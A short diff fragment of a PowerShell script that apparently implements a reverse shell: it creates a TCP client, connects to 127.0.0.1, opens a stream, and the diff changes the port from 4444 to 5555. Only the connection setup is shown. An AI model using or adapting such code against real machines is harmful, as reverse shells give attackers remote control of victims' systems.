@@ -5,7 +5,7 @@ if ($client.Connected -eq $true) {$client.Close()}
 if ($process.ExitCode -ne $null) {$process.Close()}
 exit}
 $address = '127.0.0.1'
-$port = 4444
+$port = 5555
 $client = New-Object system.net.sockets.tcpclient
 $client.connect($address,$port)
 $stream = $client.GetStream()
